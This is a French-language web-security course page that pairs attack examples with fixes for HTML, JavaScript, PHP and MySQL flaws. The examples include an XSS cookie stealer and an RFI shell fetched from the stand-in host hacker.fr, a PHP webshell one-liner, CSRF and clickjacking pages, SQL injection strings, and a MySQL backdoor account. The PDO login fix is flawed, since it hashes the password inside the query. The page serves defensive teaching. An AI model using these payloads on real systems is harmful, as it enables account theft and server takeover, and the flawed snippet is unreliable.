Langage de structure

HTML

HTML

HyperText Markup Language · Structure des pages web

Haute
1.1

🖱️ Clickjacking

Explication
Le Clickjacking consiste à superposer une page malveillante sur une page légitime via une <iframe> rendue invisible. L'utilisateur croit interagir avec le site malveillant, mais déclenche en réalité des actions sur le site légitime (virement bancaire, modification de compte…).
Exemple
HTML — attaque 
<!-- Page de l'attaquant — iframe invisible par-dessus votre banque -->
<style>
  iframe {
    position: absolute;
    opacity: 0.001; /* quasi invisible */
    z-index: 999;
    width: 100%; height: 100%;
  }
</style>

<!-- Page légitime chargée en transparence -->
<iframe src="https://mabanque.fr/confirmer-virement"></iframe>

<!-- Bouton visible mais clique sur l'iframe -->
<button>Gagner un prix !</button>
Parade
  • En-tête HTTP X-Frame-Options: DENY sur le serveur
  • Directive CSP : Content-Security-Policy: frame-ancestors 'none'
  • Vérification JavaScript (framebuster) pour détecter l'intégration en iframe
PHP — en-têtes sécurisés 
header('X-Frame-Options: DENY');
header("Content-Security-Policy: frame-ancestors 'none'");
Moyenne
1.2

📝 Formulaires non sécurisés

Explication
Les formulaires soumis en HTTP (non HTTPS) transmettent les données en clair sur le réseau. Un attaquant peut les intercepter via une attaque Man-in-the-Middle (MITM). L'absence de validation des attributs (type, maxlength, pattern) permet d'envoyer des données inattendues au serveur.
Exemple
HTML — formulaire vulnérable 
<!-- ❌ HTTP + mot de passe en type="text" -->
<form action="http://site.fr/login" method="POST">
  <input type="text"  name="username">
  <input type="text"  name="password"> <!-- visible en clair ! -->
  <button>Connexion</button>
</form>
<!-- Wireshark peut capturer username + password en direct -->
Parade
  • Toujours utiliser HTTPS (certificat TLS obligatoire)
  • type="password" pour les champs de mot de passe
  • Attributs HTML5 : required, maxlength, pattern
  • Valider également côté serveur (la validation HTML est contournable)
Haute
1.3

👁️ Données sensibles dans le code source

Explication
Le HTML est entièrement lisible via Ctrl+U. Des développeurs laissent parfois des informations sensibles dans la page : clés API, identifiants admin, commentaires de débogage. Les <input type="hidden"> sont également visibles et modifiables par l'utilisateur.
Exemple
HTML — code source exposé 
<!-- TODO: supprimer avant production -->
<!-- admin / MotDePasse123 -->
<!-- Clé API : AIzaSyD-xxxxxxxxxxxxxxxxx -->

<!-- Un attaquant peut modifier la valeur "admin" dans la console -->
<input type="hidden" name="user_role" value="admin">
Parade
  • Ne jamais stocker de secrets dans le HTML ni les commentaires
  • Stocker les clés API côté serveur en variables d'environnement
  • Ne jamais faire confiance aux champs cachés pour la sécurité — vérifier côté serveur
  • Utiliser des linters pour détecter les fuites avant le déploiement

Langage côté client

JS

JavaScript

Langage de script exécuté dans le navigateur

Critique
2.1

⚡ XSS — Cross-Site Scripting

Explication
Le XSS est l'une des failles les plus répandues (OWASP Top 10). Elle survient quand un site affiche du contenu utilisateur sans le filtrer, permettant d'injecter du JavaScript malveillant exécuté chez les autres visiteurs. Conséquences : vol de cookies de session, redirection, keylogger.
  • XSS Réfléchi : script dans l'URL renvoyé par le serveur
  • XSS Stocké : script sauvegardé en base et affiché à tous
Exemple
JavaScript — injection XSS 
// L'attaquant poste ce commentaire dans un formulaire :
<script>
  document.location = 'https://hacker.fr/steal?c=' + document.cookie;
</script>
// → les cookies de chaque visiteur sont envoyés à l'attaquant

// Code JS vulnérable (innerHTML interprète le HTML) :
document.getElementById('msg').innerHTML = userInput;
// ↑ le script s'exécute !
Parade
  • Utiliser textContent au lieu de innerHTML
  • Encoder les données côté serveur (< → &lt;)
  • Mettre en place une Content Security Policy (CSP)
  • Cookies avec le flag HttpOnly pour les rendre inaccessibles depuis JS
JavaScript — version sécurisée 
// ❌ Dangereux :
element.innerHTML = userInput;

// ✅ Sécurisé :
element.textContent = userInput;

// ✅ Encoder le HTML :
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
Haute
2.2

🗄️ Manipulation DOM & stockage local

Explication
Le code JavaScript est entièrement visible via F12. Un attaquant peut lire la logique, modifier les variables en console, et accéder aux données dans localStorage. En cas de XSS, tout ce qui est dans localStorage est immédiatement compromis.
Exemple
JavaScript — localStorage mal utilisé 
// ❌ Token sensible dans localStorage (accessible par tout JS) :
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiJ9...');
localStorage.setItem('role',  'admin');

// ❌ Vérification de sécurité uniquement en JS :
if (localStorage.getItem('role') === 'admin') {
  showAdminPanel();
  // L'attaquant tape en console : localStorage.setItem('role','admin')
}
Parade
  • Ne jamais stocker de tokens sensibles dans localStorage
  • Préférer les cookies HttpOnly + Secure + SameSite=Strict
  • Vérifier les droits et rôles côté serveur uniquement
  • Minifier/obfusquer le JS en production pour compliquer la lecture
Haute
2.3

🔄 CSRF — Cross-Site Request Forgery

Explication
Le CSRF force le navigateur d'un utilisateur connecté à effectuer des requêtes non voulues vers un site où il est authentifié. L'attaquant piège la victime (lien ou image dans un e-mail) et son navigateur envoie automatiquement ses cookies de session.
Exemple
HTML — attaque CSRF 
<!-- Page malveillante envoyée à la victime -->
<!-- Si la victime est connectée à mabanque.fr, ses cookies
     sont envoyés automatiquement ! -->

<!-- Méthode GET (image 0×0) : -->
<img src="https://mabanque.fr/virement?montant=5000&vers=attaquant"
     width="0" height="0">

<!-- Méthode POST (formulaire soumis automatiquement) : -->
<form action="https://mabanque.fr/virement" method="POST">
  <input type="hidden" name="montant" value="5000">
</form>
<script>document.forms[0].submit();</script>
Parade
  • Implémenter des jetons CSRF (token aléatoire unique par session)
  • Cookie avec SameSite=Strict pour bloquer les requêtes cross-site
  • Vérifier l'en-tête Origin ou Referer côté serveur
  • Re-authentification pour les actions critiques (virement, suppression)
PHP — jeton CSRF 
// Générer et stocker le token en session :
$_SESSION['csrf'] = bin2hex(random_bytes(32));

// Dans le formulaire :
<input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">

// Vérification à la réception :
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'])) {
  die('Attaque CSRF détectée !');
}

Langage côté serveur

PHP

PHP

Hypertext Preprocessor · Langage serveur dynamique

Critique
3.1

📂 Inclusion de fichiers (LFI / RFI)

Explication
La LFI (Local File Inclusion) permet d'inclure un fichier local arbitraire en manipulant un paramètre d'URL. La RFI (Remote File Inclusion) va plus loin : elle permet d'inclure un fichier distant contrôlé par l'attaquant, menant à une exécution de code à distance (RCE).
Exemple
PHP — vulnérable 
// ❌ Inclusion directe sans validation :
$page = $_GET['page'];
include($page);

// ❌ Attaque LFI — lire /etc/passwd :
// site.fr/?page=../../../../etc/passwd

// ❌ Attaque RFI — exécuter un shell distant :
// site.fr/?page=http://hacker.fr/shell.php
// shell.php contient : <?php system($_GET['cmd']); ?>
// → contrôle total du serveur !
Parade
  • Utiliser une liste blanche des fichiers autorisés
  • Ne jamais passer un paramètre utilisateur à include() directement
  • Désactiver allow_url_include dans php.ini pour bloquer les RFI
  • Valider et nettoyer tous les paramètres d'entrée
PHP — liste blanche 
$pages_ok = ['accueil', 'contact', 'about'];
$page    = $_GET['page'] ?? 'accueil';

if (in_array($page, $pages_ok)) {
    include('pages/' . $page . '.php');
} else {
    http_response_code(404);
    include('pages/404.php');
}
Critique
3.2

📤 Upload de fichiers malveillants

Explication
Sans vérification stricte, un attaquant peut uploader un fichier PHP déguisé en image. Si ce fichier est accessible via le web, il peut exécuter du code arbitraire — c'est un webshell. L'extension .php.jpg ou la manipulation du Content-Type peut tromper une vérification naïve.
Exemple
PHP — upload sans vérification 
// ❌ Aucune vérification du type de fichier :
move_uploaded_file(
  $_FILES['fichier']['tmp_name'],
  'uploads/' . $_FILES['fichier']['name']
);

// L'attaquant envoie "shell.php" contenant :
// <?php system($_GET['cmd']); ?>
// Puis accède à : site.fr/uploads/shell.php?cmd=ls
// → contrôle total du serveur !
Parade
  • Vérifier l'extension ET le type MIME réel avec finfo_file()
  • Renommer les fichiers upladés (nom aléatoire, sans extension exécutable)
  • Stocker les uploads hors de la racine web
  • Limiter la taille maximale des fichiers uploadés
PHP — upload sécurisé 
$ext_ok  = ['jpg', 'jpeg', 'png', 'gif'];
$mime_ok = ['image/jpeg', 'image/png', 'image/gif'];

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['f']['tmp_name']);
$ext   = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));

if (in_array($mime, $mime_ok) && in_array($ext, $ext_ok)) {
    $nom = bin2hex(random_bytes(16)) . '.' . $ext;
    move_uploaded_file($_FILES['f']['tmp_name'],
                       '/var/stockage_securise/' . $nom);
}
Moyenne
3.3

⚠️ Exposition des erreurs PHP

Explication
En production, PHP peut afficher des erreurs détaillées révélant des informations critiques : chemins internes, noms de tables SQL, version PHP, structure du code. Ces éléments facilitent la cartographie du système par un attaquant.
Exemple
Message d'erreur exposé 
Warning: mysqli_connect(): Access denied for user 'root'@'localhost'
  in /var/www/html/config/database.php on line 12

// L'attaquant apprend :
// → chemin exact : /var/www/html/config/database.php
// → compte MySQL : root (privilèges maximaux)
// → structure de la connexion BDD
Parade
  • display_errors = Off dans php.ini en production
  • Journaliser dans un fichier log sécurisé : log_errors = On
  • Pages d'erreur personnalisées (403, 404, 500) sans détails techniques
  • Ne jamais utiliser le compte root MySQL pour l'application
php.ini — production 
display_errors        = Off
display_startup_errors = Off
log_errors            = On
error_log             = /var/log/php/erreurs.log
error_reporting       = E_ALL  ; loguer tout, afficher rien

Base de données relationnelle

SQL

MySQL

Système de gestion de bases de données relationnelles

Critique
4.1

💉 Injection SQL

Explication
L'injection SQL est la faille la plus dangereuse (OWASP #1 pendant des années). Elle survient quand des données utilisateur sont insérées directement dans une requête SQL sans nettoyage. L'attaquant peut :
  • Contourner l'authentification (connexion sans mot de passe)
  • Extraire toutes les données de la base (mots de passe, cartes bancaires…)
  • Modifier ou supprimer des données (DROP TABLE)
Exemple
PHP + SQL — vulnérable 
// ❌ Concaténation directe :
$sql = "SELECT * FROM users
        WHERE username='$user' AND password='$pass'";

// Saisie de l'attaquant : admin'--
// La requête devient :
// SELECT * FROM users WHERE username='admin'--' AND password='...'
//                                              ^^ commente le reste
// → connexion en tant qu'admin sans mot de passe !

// Avec UNION, exfiltration totale :
// ' UNION SELECT username, password, 3 FROM users--
Parade
  • Utiliser les requêtes préparées (Prepared Statements) avec PDO
  • Ne jamais concaténer une variable utilisateur dans une requête SQL
  • Principe de moindre privilège : compte MySQL sans DROP ni FILE
  • Utiliser un WAF (Web Application Firewall)
PHP — requêtes préparées PDO 
// ✅ Paramètres traités comme des données, jamais comme du code :
$stmt = $pdo->prepare(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?"
);
$stmt->execute([$_POST['username'], password_hash($_POST['password'], PASSWORD_BCRYPT)]);
// → injection SQL impossible !
Critique
4.2

🔑 Mots de passe en clair & hashage faible

Explication
Stocker les mots de passe en clair ou avec MD5/SHA1 est critique. En cas de fuite, tous les mots de passe sont compromis. MD5 et SHA1 sont cassés pour les mots de passe : des tables arc-en-ciel permettent de retrouver le mot de passe original en quelques secondes sur des sites en ligne.
Exemple
SQL — base vulnérable 
-- ❌ Mots de passe en clair :
SELECT * FROM users;
-- id | username | password
-- 1  | alice    | motdepasse123
-- 2  | admin    | Admin@2024!

-- ❌ MD5 cassable en ligne en quelques secondes :
INSERT INTO users VALUES (1, 'alice', MD5('motdepasse123'));
-- → 5f4dcc3b5aa765d61d8327deb882cf99
-- crackstation.net retrouve ce hash instantanément !
Parade
  • Utiliser password_hash() avec bcrypt ou Argon2
  • Vérifier avec password_verify() uniquement
  • Ne jamais utiliser MD5, SHA1 ou SHA256 seuls pour des mots de passe
  • Le sel (salt) unique par utilisateur est automatique avec password_hash()
PHP — hashage bcrypt 
// ✅ Enregistrement :
$hash = password_hash($_POST['password'], PASSWORD_BCRYPT);
// → $2y$10$8K1p/a0dR1... (hash unique, irréversible)

// ✅ Connexion :
if (password_verify($_POST['password'], $hash_en_bdd)) {
    // Connexion autorisée ✓
} else {
    // Refusé
}
Haute
4.3

🔓 Excès de privilèges des comptes SQL

Explication
Le principe de moindre privilège stipule que chaque compte ne doit avoir que les droits nécessaires. Si l'application utilise le compte root, une injection SQL réussie peut entraîner la suppression de tables, la lecture de fichiers système, ou la création de backdoors MySQL.
Exemple
SQL — abus de privilèges excessifs 
-- Si l'app tourne en root, l'attaquant (via injection) peut :

-- 1. Lire des fichiers système :
SELECT LOAD_FILE('/etc/passwd');

-- 2. Supprimer toutes les données :
DROP TABLE users; DROP TABLE commandes;

-- 3. Créer une backdoor MySQL :
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
Parade
  • Créer un compte dédié avec seulement SELECT, INSERT, UPDATE sur les tables nécessaires
  • Interdire l'accès externe au port MySQL (3306) via pare-feu
  • Supprimer les comptes MySQL inutilisés et changer les mots de passe par défaut
  • Activer les logs d'audit MySQL pour surveiller les requêtes
SQL — compte restrictif 
-- ✅ Compte dédié avec droits minimaux :
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'MotDePasseFort!';
GRANT SELECT, INSERT, UPDATE ON ma_base.users     TO 'app_user'@'localhost';
GRANT SELECT, INSERT          ON ma_base.commandes TO 'app_user'@'localhost';
FLUSH PRIVILEGES;

-- ❌ À ne JAMAIS faire :
GRANT ALL PRIVILEGES ON *.* TO 'app'@'%'; -- beaucoup trop permissif !

Synthèse · TP Cybersécurité

Ne jamais faire
confiance au client.

La sécurité web repose sur un principe fondamental : valider systématiquement côté serveur, quelle que soit la validation côté client. Chaque technologie (HTML, JS, PHP, MySQL) présente ses propres vulnérabilités mais elles partagent la même origine — un manque de filtrage ou de cloisonnement.

La défense efficace repose sur une approche en couches (défense en profondeur). Une seule faille non corrigée peut suffire à compromettre un système entier.
